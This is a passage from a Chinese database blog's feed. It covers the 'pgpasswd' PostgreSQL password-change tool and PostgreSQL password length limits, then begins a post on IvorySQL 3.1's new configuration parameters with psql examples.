<p>类似于 Linux 中的 <code>passwd</code> 命令，使用 <code>pgpasswd</code> 可以从 Linux 命令行更改 PostgreSQL 帐户密码，无需输入任何 SQL 语句。</p>
<p><code>pgpasswd</code> 是 PostgreSQL 扩展和独立可执行文件（无需在数据库中安装任何内容，无需运行 CREATE EXTENSION）。</p>
<p>下载源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shawn0915/pgpasswd.git</span><br></pre></td></tr></table></figure></div>
<p>目录结构比较简洁：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 pgpasswd]$ ls</span><br><span class="line">LICENSE  Makefile  META.json  pgpasswd.c  README.md</span><br></pre></td></tr></table></figure></div>
<ul>
<li>LICENSE: 是本软件的许可。pgpasswd 软件根据 PostgreSQL 许可证的条款发布。许可中规定，允许任何人出于任何目的，免费使用、复制、修改和分发该软件及其文档。</li>
<li>Makefile：用于自动化构建和管理软件项目，它由一系列规则和命令组成。在本工程中，提供了 <code>all</code>, <code>install</code>, <code>clean</code>, <code>pgxn</code> 等四种命令。</li>
<li>META.json：包含 pgpasswd 项目的元数据。元数据中包括项目名称、版本信息、维护者、许可证、要求的 PostgreSQL 版本等信息。</li>
<li>pgpasswd.c：该工程的主文件，包含了项目用法的具体实现，以及一些约束条件。</li>
<li><a class="link"   href="http://README.md" >README.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：描述 pgpasswd 项目的内容和如何编译、安装、使用项目，帮助用户快速了解项目的功能和用法，从而提高项目的可用性和传播性。</li>
</ul>
<p>其中，在项目中，我们可以看到 <code>PASSWORD_MAX_LENGTH=30</code> 约束，意味着密码长度不能超过 30。</p>
<p>工程直接编译、安装即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 pgpasswd]$ make</span><br><span class="line">gcc -I/opt/pgsql/include -I/opt/pgsql/include/server -c pgpasswd.c -Wall</span><br><span class="line">gcc -I/opt/pgsql/include -L/opt/pgsql/lib -lpq -o pgpasswd pgpasswd.o</span><br><span class="line">[postgres@rocky9 pgpasswd]$ make install</span><br><span class="line">install	pgpasswd /opt/pgsql/bin</span><br></pre></td></tr></table></figure></div>
<p>可以看到将编译好的二进制文件 <code>pgpasswd</code> 安装到了 <code>bin</code> 目录下。</p>
<p>使用方式：</p>
<p>需要指定参数 <code>-U</code> 需要修改密码的用户名，<code>-h</code> 数据库连接地址，<code>-p</code> 数据库端口，<code>-d postgres</code> 系统库，否则，会提示报错 <code>Missing parameters</code>。</p>
<p>此外，可以加 <code>-v</code> 参数打印更多信息，比如客户端版本信息 <code>PG libpq version</code>，连接信息 <code>conninfo</code>，以及 PG 服务器的版本信息 <code>PG server version</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ pgpasswd -U shawnyan -h <span class="number">127.1</span> -p <span class="number">5432</span> -d postgres -v</span><br><span class="line">Password:</span><br><span class="line">PG libpq version: <span class="number">160002</span></span><br><span class="line">conninfo: user=shawnyan host=<span class="number">127.1</span> port=<span class="number">5432</span> dbname=postgres password=test  </span><br><span class="line">PG server version: <span class="number">160002</span></span><br><span class="line">New password:</span><br><span class="line">Confirm new password:</span><br><span class="line">stmt=ALTER USER shawnyan PASSWORD <span class="string">&#x27;test1&#x27;</span> </span><br><span class="line">Password changed.</span><br></pre></td></tr></table></figure></div>
<p>用新密码测试连接：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">[postgres@rocky9 ~]$ psql -U shawnyan -h <span class="number">127.1</span></span><br><span class="line">Password <span class="keyword">for</span> user shawnyan: </span><br><span class="line">psql (<span class="number">16.2</span>-ShawnYan)</span><br><span class="line">Type <span class="string">&quot;help&quot;</span> <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">postgres=&gt; </span><br></pre></td></tr></table></figure></div>
<p>到此，PG 扩展 <code>pgpasswd</code> 介绍到这里，欢迎“品尝”。</p>
<h2 id="再討論：PG-密碼長度">再討論：PG 密碼長度</h2>
<p>在上文中提到，<code>pgpasswd</code> 只允許密碼設定長度為 30，<br>
如果原始密碼或新密碼都超過 30，那麽程序會異常退出，無法修改密碼。</p>
<p>畢竟是個 TOY，不要在意這些細節，keep going…</p>
<p>那麽，問題來了，在 PostgreSQL 服務器中，用戶密碼最長可以設定為多少呢？</p>
<p>以 PostgreSQL v16 為例，用戶密碼字段為 <code>text</code>，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(postgres@[local]) [postgres] 20:57:41# \d pg_catalog.pg_authid</span><br><span class="line">                        Table &quot;pg_catalog.pg_authid&quot;</span><br><span class="line">     Column     |           Type           | Collation | Nullable | Default </span><br><span class="line">----------------+--------------------------+-----------+----------+---------</span><br><span class="line"> oid            | oid                      |           | not null | </span><br><span class="line"> rolname        | name                     |           | not null | </span><br><span class="line"> rolsuper       | boolean                  |           | not null | </span><br><span class="line"> rolinherit     | boolean                  |           | not null | </span><br><span class="line"> rolcreaterole  | boolean                  |           | not null | </span><br><span class="line"> rolcreatedb    | boolean                  |           | not null | </span><br><span class="line"> rolcanlogin    | boolean                  |           | not null | </span><br><span class="line"> rolreplication | boolean                  |           | not null | </span><br><span class="line"> rolbypassrls   | boolean                  |           | not null | </span><br><span class="line"> rolconnlimit   | integer                  |           | not null | </span><br><span class="line"> rolpassword    | text                     | C         |          | </span><br><span class="line"> rolvaliduntil  | timestamp with time zone |           |          | </span><br><span class="line">Indexes:</span><br><span class="line">    &quot;pg_authid_oid_index&quot; PRIMARY KEY, btree (oid), tablespace &quot;pg_global&quot;</span><br><span class="line">    &quot;pg_authid_rolname_index&quot; UNIQUE CONSTRAINT, btree (rolname), tablespace &quot;pg_global&quot;</span><br><span class="line">Tablespace: &quot;pg_global&quot;</span><br></pre></td></tr></table></figure></div>
<p>這意味著，對與密碼的最大長度，PostgreSQL 并沒有一個硬性的限制。</p>
<p>最開始就是這樣的麽？并不是。</p>
<p><a class="link"   href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=67a472d71c98c3d2fa322a1b4013080b20720b98" >2020-0-03, Remove arbitrary restrictions on password length. <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>该补丁最初的目标是协调各种任意的密码长度受到限制，但过了一段时间，一个更好的想法出现了：<br>
让我们摆脱那些固定的限制。</p>
<p>這裏的限制是指之前版本中的 100 位密碼，從 PG 14 開始，<br>
隨著 <a class="link"   href="https://github.com/postgres/postgres/commit/67a472d71c98c3d2fa322a1b4013080b20720b98" >67a472d <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
patch 被 merge 到 master，這一限制也被取消掉了。</p>
<p>當然，現在 PG 默認的加密算法為 <code>SCRAM-SHA-256</code>，密碼加密后，<br>
實際表中存儲的密碼并不會很長很長很長。</p>
<p>更多討論：</p>
<ul>
<li><a class="link"   href="https://www.postgresql.org/message-id/09512C4F-8CB9-4021-B455-EF4C4F0D55A0@amazon.com" >Maximum password length <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.postgresql.org/message-id/tencent_DDB8F58E4291FA8FB5AD82AE317519A77E07%40qq.com" >Re: Is there still password max length restrictions in PG? <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>再補充一點：</p>
<p>建議使用 <code>scram-sha-256</code> 密碼驗證方法，而不是 <code>md5</code> 和 <code>password</code>。</p>
<p>建議自行對用戶名和用戶密碼設立規範，比如用戶名命名規則，密碼複雜度和長度等。</p>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>Extension</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 16</tag>
        <tag>extension</tag>
        <tag>pgpasswd</tag>
      </tags>
  </entry>
  <entry>
    <title>IvorySQL 3.1 和 2.3 系统参数变化（下篇）</title>
    <url>/2024/postgresql/ivorysql-3.1-sys-vars-2/</url>
    <content><![CDATA[<img  alt="ivorysql.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240207-d856ff9f-5e9e-474b-b5c0-0ff3718eb5c8.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="前情提要">前情提要</h2>
<p>在<a class="link"   href="https://mp.weixin.qq.com/s/UeX8mz2nFQ6rFvHKQZJoCQ" >上篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中，我们介绍了 IvorySQL 3.1 和 2.3 系统参数有哪些删减和默认值变更，本文将介绍 23 个新增参数。</p>
<h2 id="新增参数">新增参数</h2>
<p>新增参数一览如下，共 23 个。</p>
<ul>
<li>4 个安全相关
<ol>
<li>createrole_self_grant</li>
<li>gss_accept_delegation</li>
<li>reserved_connections</li>
<li>scram_iterations</li>
</ol>
</li>
<li>5 个开发选项
<ol>
<li>debug_io_direct</li>
<li>debug_logical_replication_streaming</li>
<li>debug_parallel_query</li>
<li>send_abort_for_crash</li>
<li>send_abort_for_kill</li>
</ol>
</li>
<li>1 个优化器相关
<ol>
<li>enable_presorted_aggregate</li>
</ol>
</li>
<li>1 个语言相关
<ol>
<li>icu_validation_level</li>
</ol>
</li>
<li>1 个复制相关
<ol>
<li>max_parallel_apply_workers_per_subscription</li>
</ol>
</li>
<li>1 个资源相关
<ol>
<li>vacuum_buffer_usage_limit</li>
</ol>
</li>
<li>10 个兼容性相关
<ol>
<li>nls_date_format</li>
<li>nls_timestamp_format</li>
<li>nls_timestamp_tz_format</li>
<li>ivorysql.compatible_mode</li>
<li>ivorysql.database_mode</li>
<li>ivorysql.datetime_ignore_nls_mask</li>
<li>ivorysql.enable_emptystring_to_NULL</li>
<li>ivorysql.identifier_case_switch</li>
<li>ivorysql.listen_addresses</li>
<li>ivorysql.port</li>
</ol>
</li>
</ul>
<p>接下来我们逐一介绍。</p>
<h3 id="1-createrole-self-grant">1. createrole_self_grant</h3>
<p>​<br>
如果具有 <code>CREATEROLE</code> 但没有 <code>SUPERUSER</code> 的用户创建角色，并且将其设置为非空值，则新创建的角色将被授予具有指定选项的创建用户。该值必须是设置的、继承的或以逗号分隔的列表。默认值为空字符串，这会禁用该功能。</p>
<p>此选项的目的是允许非超级用户的 <code>CREATEROLE</code> 用户自动继承或自动获得对任何创建的用户设置 <code>ROLE</code> 的能力。由于 CREATEROLE 用户始终在创建的角色上隐式授予 <code>ADMIN OPTION</code>，因此该用户始终可以执行 <code>GRANT</code> 语句来实现与此设置相同的效果。但是，如果自动授予，出于可用性原因，可能会很方便。超级用户自动继承每个角色的权限，并且始终可以为任何角色设置 <code>ROLE</code>，并且此设置可用于为 <code>CREATEROLE</code> 用户创建的用户产生类似的行为。</p>
<p>用法示例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[ivorysql<span class="variable">@shawnyan</span> <span class="operator">~</span>]$ psql</span><br><span class="line">psql (<span class="number">16.1</span><span class="operator">-</span>ShawnYan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> createrole_self_grant;</span><br><span class="line"> createrole_self_grant</span><br><span class="line"><span class="comment">-----------------------</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">CREATE</span> <span class="keyword">USER</span> shawnyan_user_1 CREATEROLE NOINHERIT;</span><br><span class="line"><span class="keyword">CREATE</span> ROLE</span><br><span class="line">ivorysql<span class="operator">=</span># \c <span class="operator">-</span> shawnyan_user_1</span><br><span class="line">You <span class="keyword">are</span> now connected <span class="keyword">to</span> database &quot;postgres&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;shawnyan_user_1&quot;.</span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">USER</span> shawnyan_tenant_1;</span><br><span class="line"><span class="keyword">CREATE</span> ROLE</span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SET</span> createrole_self_grant <span class="operator">=</span> <span class="string">&#x27;set, inherit&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SET</span> ROLE shawnyan_user_1;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> roleid::regrole, <span class="keyword">member</span>::regrole, grantor::regrole, <span class="operator">*</span> <span class="keyword">FROM</span> pg_auth_members;</span><br><span class="line">        roleid        <span class="operator">|</span>     <span class="keyword">member</span>      <span class="operator">|</span> grantor  <span class="operator">|</span>  oid  <span class="operator">|</span> roleid <span class="operator">|</span> <span class="keyword">member</span> <span class="operator">|</span> grantor <span class="operator">|</span> admin_option <span class="operator">|</span> inherit_option <span class="operator">|</span> set_option</span><br><span class="line"><span class="comment">----------------------+-----------------+----------+-------+--------+--------+---------+--------------+----------------+------------</span></span><br><span class="line">...</span><br><span class="line"> shawnyan_tenant_1    <span class="operator">|</span> shawnyan_user_1 <span class="operator">|</span> ivorysql <span class="operator">|</span> <span class="number">16398</span> <span class="operator">|</span>  <span class="number">16397</span> <span class="operator">|</span>  <span class="number">16396</span> <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> t            <span class="operator">|</span> f              <span class="operator">|</span> f</span><br><span class="line">(<span class="number">4</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> \c <span class="operator">-</span> shawnyan_user_1</span><br><span class="line">You <span class="keyword">are</span> now connected <span class="keyword">to</span> database &quot;ivorysql&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;shawnyan_user_1&quot;.</span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SET</span> createrole_self_grant <span class="operator">=</span> <span class="string">&#x27;set, inherit&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">USER</span> shawnyan_tenant_2;</span><br><span class="line"><span class="keyword">CREATE</span> ROLE</span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> roleid::regrole, <span class="keyword">member</span>::regrole, grantor::regrole, <span class="operator">*</span> <span class="keyword">FROM</span> pg_auth_members;</span><br><span class="line">        roleid        <span class="operator">|</span>     <span class="keyword">member</span>      <span class="operator">|</span>     grantor     <span class="operator">|</span>  oid  <span class="operator">|</span> roleid <span class="operator">|</span> <span class="keyword">member</span> <span class="operator">|</span> grantor <span class="operator">|</span> admin_option <span class="operator">|</span> inherit_option <span class="operator">|</span> set_option</span><br><span class="line"><span class="comment">----------------------+-----------------+-----------------+-------+--------+--------+---------+--------------+----------------+------------</span></span><br><span class="line">...</span><br><span class="line"> shawnyan_tenant_1    <span class="operator">|</span> shawnyan_user_1 <span class="operator">|</span> ivorysql        <span class="operator">|</span> <span class="number">16398</span> <span class="operator">|</span>  <span class="number">16397</span> <span class="operator">|</span>  <span class="number">16396</span> <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> t            <span class="operator">|</span> f              <span class="operator">|</span> f</span><br><span class="line"> shawnyan_tenant_2    <span class="operator">|</span> shawnyan_user_1 <span class="operator">|</span> ivorysql        <span class="operator">|</span> <span class="number">16400</span> <span class="operator">|</span>  <span class="number">16399</span> <span class="operator">|</span>  <span class="number">16396</span> <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> t            <span class="operator">|</span> f              <span class="operator">|</span> f</span><br><span class="line"> shawnyan_tenant_2    <span class="operator">|</span> shawnyan_user_1 <span class="operator">|</span> shawnyan_user_1 <span class="operator">|</span> <span class="number">16401</span> <span class="operator">|</span>  <span class="number">16399</span> <span class="operator">|</span>  <span class="number">16396</span> <span class="operator">|</span>   <span class="number">16396</span> <span class="operator">|</span> f            <span class="operator">|</span> t              <span class="operator">|</span> t</span><br><span class="line">(<span class="number">6</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">show</span> createrole_self_grant;</span><br><span class="line"> createrole_self_grant</span><br><span class="line"><span class="comment">-----------------------</span></span><br><span class="line"> <span class="keyword">set</span>, inherit</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="2-gss-accept-delegation">2. gss_accept_delegation</h3>
<p>添加对 Kerberos 凭证委托的支持。</p>
<p>这可以通过服务器变量 <code>gss_accept_delegation</code> 和 libpq 连接参数 <code>gssdelegation</code> 来启用。</p>
<p>默认值为 <code>off</code>，这意味着不接受来自客户端的凭据。</p>
<h3 id="3-reserved-connections">3. reserved_connections</h3>
<p>确定具有 <code>pg_use_reserved_connections</code> 角色权限的角色为连接保留的连接“插槽”的数量。当空闲连接槽的数量大于 <code>superuser_reserved_connections</code>，但小于或等于 <code>superuser_reserved_connections</code> 和 <code>reserved_connections</code> 的总和时，新的连接将只被超级用户和具有 <code>pg_use_reserved_connections</code> 权限的角色接受。如果 <code>superuser_reserved_connections</code> 或更少的连接槽可用，则只接受超级用户的新连接。</p>
<p>缺省值为零连接。该值必须小于 <code>max_connections</code> 减去 <code>superuser_reserved_connections</code>。该参数只能在服务器启动时设置。</p>
<p>关联参数： <code>superuser_reserved_connections</code><br>
关联角色： <code>pg_use_reserved_connections</code></p>
<h3 id="4-scram-iterations">4. scram_iterations</h3>
<p>允许使用服务器变量 <code>scram_iterations</code> 设置 SCRAM 迭代计数。<br>
使用 SCRAM-SHA-256 加密密码时要执行的计算迭代次数。</p>
<h3 id="5-debug-io-direct">5. debug_io_direct</h3>
<p>从 IvorySQL 3 开始，新增 3 个用于开发调试的参数，<code>debug_io_direct</code>，<code>debug_logical_replication_streaming</code> 和 <code>debug_parallel_query</code>。</p>
<p>可以设置为空字符串(默认值)以禁用直接 I/O，或者应该使用直接 I/O 的逗号分隔的操作列表。</p>
<p>目前，该特性降低了性能，并且仅用于开发人员测试。</p>
<h3 id="6-debug-logical-replication-streaming">6. debug_logical_replication_streaming</h3>
<p>在逻辑复制中，添加服务器变量以控制逻辑解码发布者如何传输更改以及订阅者如何应用更改。</p>
<p>默认值为 <code>buffered</code>，还可选 <code>immediate</code>。</p>
<h3 id="7-debug-parallel-query">7. debug_parallel_query</h3>
<p>上篇文章提及过，该参数由 <code>force_parallel_mode</code> 更名而来。</p>
<p><code>debug_parallel_query</code> 允许的值是 <code>off</code>(仅在期望提高性能时使用并行模式)、<code>on</code>(对所有被认为是安全的查询强制并行查询)和<code>regress</code>(类似于 on，但会有例外行为)。</p>
<h3 id="8-send-abort-for-crash">8. send_abort_for_crash</h3>
<p>允许 postmaster 用中止信号终止子进程。</p>
<p>这允许为卡住的子进程收集核心转储 (core dump)。这是由 <code>send_abort_for_crash</code> 和 <code>send_abort_for_kill</code> 控制的。postmaster 的 <code>-T</code> 开关现在与设置 <code>send_abort_for_crash</code> 相同。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@shawnyan bin]$ postgres --help | grep &#x27;\-T&#x27;</span><br><span class="line">  -T                 send SIGABRT to all backend processes if one dies</span><br></pre></td></tr></table></figure></div>
<h3 id="9-send-abort-for-kill">9. send_abort_for_kill</h3>
<p>同上。</p>
<p>区别在于 <code>send_abort_for_crash</code> 发送的是 SIGABRT，而 <code>send_abort_for_kill</code> 发送的是 SIGKILL。</p>
<h3 id="10-enable-presorted-aggregate">10. enable_presorted_aggregate</h3>
<p>优化器中为具有 <code>ORDER BY</code> 或 <code>DISTINCT</code> 的聚合添加使用预排序数据的能力，默认开启，通过该参数可将其关闭。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> t(id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># explain <span class="keyword">select</span> <span class="built_in">sum</span>(id <span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">from</span> t;</span><br><span class="line">                           QUERY PLAN</span><br><span class="line"><span class="comment">-----------------------------------------------------------------</span></span><br><span class="line"> Aggregate  (cost<span class="operator">=</span><span class="number">192.53</span>.<span class="number">.192</span><span class="number">.54</span> <span class="keyword">rows</span><span class="operator">=</span><span class="number">1</span> width<span class="operator">=</span><span class="number">8</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span>  Sort  (cost<span class="operator">=</span><span class="number">179.78</span>.<span class="number">.186</span><span class="number">.16</span> <span class="keyword">rows</span><span class="operator">=</span><span class="number">2550</span> width<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">         Sort Key: id</span><br><span class="line">         <span class="operator">-</span><span class="operator">&gt;</span>  Seq Scan <span class="keyword">on</span> t  (cost<span class="operator">=</span><span class="number">0.00</span>.<span class="number">.35</span><span class="number">.50</span> <span class="keyword">rows</span><span class="operator">=</span><span class="number">2550</span> width<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">(<span class="number">4</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">set</span> enable_presorted_aggregate <span class="keyword">to</span> off;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span># explain <span class="keyword">select</span> <span class="built_in">sum</span>(id <span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">from</span> t;</span><br><span class="line">                        QUERY PLAN</span><br><span class="line"><span class="comment">-----------------------------------------------------------</span></span><br><span class="line"> Aggregate  (cost<span class="operator">=</span><span class="number">41.88</span>.<span class="number">.41</span><span class="number">.88</span> <span class="keyword">rows</span><span class="operator">=</span><span class="number">1</span> width<span class="operator">=</span><span class="number">8</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span>  Seq Scan <span class="keyword">on</span> t  (cost<span class="operator">=</span><span class="number">0.00</span>.<span class="number">.35</span><span class="number">.50</span> <span class="keyword">rows</span><span class="operator">=</span><span class="number">2550</span> width<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="11-icu-validation-level">11. icu_validation_level</h3>
<p>当遇到 ICU 语言环境验证问题时，控制使用哪个消息级别来报告问题。</p>
<p>如果设置为 <code>DISABLED</code> 则不报告验证问题。默认值是 <code>WARNING</code>。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">CREATE</span> <span class="keyword">COLLATION</span> nonsense (provider <span class="operator">=</span> icu, locale <span class="operator">=</span> <span class="string">&#x27;nonsense&#x27;</span>);</span><br><span class="line">WARNING:  ICU locale &quot;nonsense&quot; has <span class="literal">unknown</span> <span class="keyword">language</span> &quot;nonsense&quot;</span><br><span class="line">HINT:  <span class="keyword">To</span> disable ICU locale validation, <span class="keyword">set</span> the <span class="keyword">parameter</span> &quot;icu_validation_level&quot; <span class="keyword">to</span> &quot;disabled&quot;.</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">COLLATION</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">set</span> icu_validation_level <span class="keyword">to</span> disabled;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">CREATE</span> <span class="keyword">COLLATION</span> nonsense1 (provider <span class="operator">=</span> icu, locale <span class="operator">=</span> <span class="string">&#x27;nonsense&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">COLLATION</span></span><br></pre></td></tr></table></figure></div>
<h3 id="12-max-parallel-apply-workers-per-subscription">12. max_parallel_apply_workers_per_subscription</h3>
<p>每次订阅的最大并行应用程序工作者数。该参数通过订阅参数 <code>streaming = parallel</code> 控制正在进行的事务流的并行度。</p>
<p>并行应用程序是从 <code>max_logical_replication_workers</code> 定义的池中获取的。</p>
<p>默认值为 2。此参数只能在 postgresql.conf 文件或服务器命令行中设置。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">alter</span> <span class="keyword">system</span> <span class="keyword">set</span> max_parallel_apply_workers_per_subscription <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span></span><br><span class="line">...</span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> max_parallel_apply_workers_per_subscription;</span><br><span class="line"> max_parallel_apply_workers_per_subscription</span><br><span class="line"><span class="comment">---------------------------------------------</span></span><br><span class="line"> <span class="number">5</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<!--
select * from pg_subscription;
create subscription s1 connection 'dbname=postgres' publication p1 with (streaming = parallel);
-->
<h3 id="13-vacuum-buffer-usage-limit">13. vacuum_buffer_usage_limit</h3>
<p>允许通过 vacuum 和 analyze 来控制共享缓冲区的使用。</p>
<p>VACUUM/ANALYZE 选项是 <code>BUFFER_USAGE_LIMIT</code>, vacuumdb 选项是 <code>--buffer-usage-limit</code>。默认值由服务器变量 vacuum_buffer_usage_limit 设置，该变量还控制 autovacuum。</p>
<p>VACUUM 使用类似于顺序扫描的环，但是，这个环的大小由 vacuum_buffer_usage_limit GUC 控制。脏页不会从环上移除。相反，如果需要，则刷新 WAL 以允许重用缓冲区。在 8.3 引入缓冲区环策略之前，VACUUM 的缓冲区被发送到自由列表，这实际上是一个 1 缓冲区的缓冲区环，导致过多的 WAL 刷新。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># ANALYZE (BUFFER_USAGE_LIMIT <span class="number">128</span>) t;</span><br><span class="line">ANALYZE</span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> vacuum_buffer_usage_limit;</span><br><span class="line"> vacuum_buffer_usage_limit</span><br><span class="line"><span class="comment">---------------------------</span></span><br><span class="line"> <span class="number">256</span>kB</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="14-nls-date-format">14. nls_date_format</h3>
<p>接下来的 10 个参数是 IvorySQL 为兼容 Oracle 而增设参数，在 IvorySQL 官方文档中也有相关描述。</p>
<p><code>nls_date_format</code> 表示默认的日期格式。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> nls_date_format;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">---+-----------</span></span><br><span class="line">nls_date_format <span class="operator">|</span> YYYY<span class="operator">-</span>MM<span class="operator">-</span>DD</span><br></pre></td></tr></table></figure></div>
<h3 id="15-nls-timestamp-format">15. nls_timestamp_format</h3>
<p><code>nls_timestamp_format</code> 表示带时间的日期格式。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> nls_timestamp_format;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">--------+--------------------------</span></span><br><span class="line">nls_timestamp_format <span class="operator">|</span> YYYY<span class="operator">-</span>MM<span class="operator">-</span>DD HH24:MI:SS.FF6</span><br></pre></td></tr></table></figure></div>
<h3 id="16-nls-timestamp-tz-format">16. nls_timestamp_tz_format</h3>
<p><code>nls_timestamp_tz_format</code> 表示带时区的日期格式。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> nls_timestamp_tz_format;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">-----------+----------------------------------</span></span><br><span class="line">nls_timestamp_tz_format <span class="operator">|</span> YYYY<span class="operator">-</span>MM<span class="operator">-</span>DD HH24:MI:SS.FF6 TZH:TZM</span><br></pre></td></tr></table></figure></div>
<h3 id="17-ivorysql-compatible-mode">17. ivorysql.compatible_mode</h3>
<p>表示当前兼容 pg 还是 oracle。</p>
<p>普通连接到默认端口 5432，显示为 pg 模式。</p>
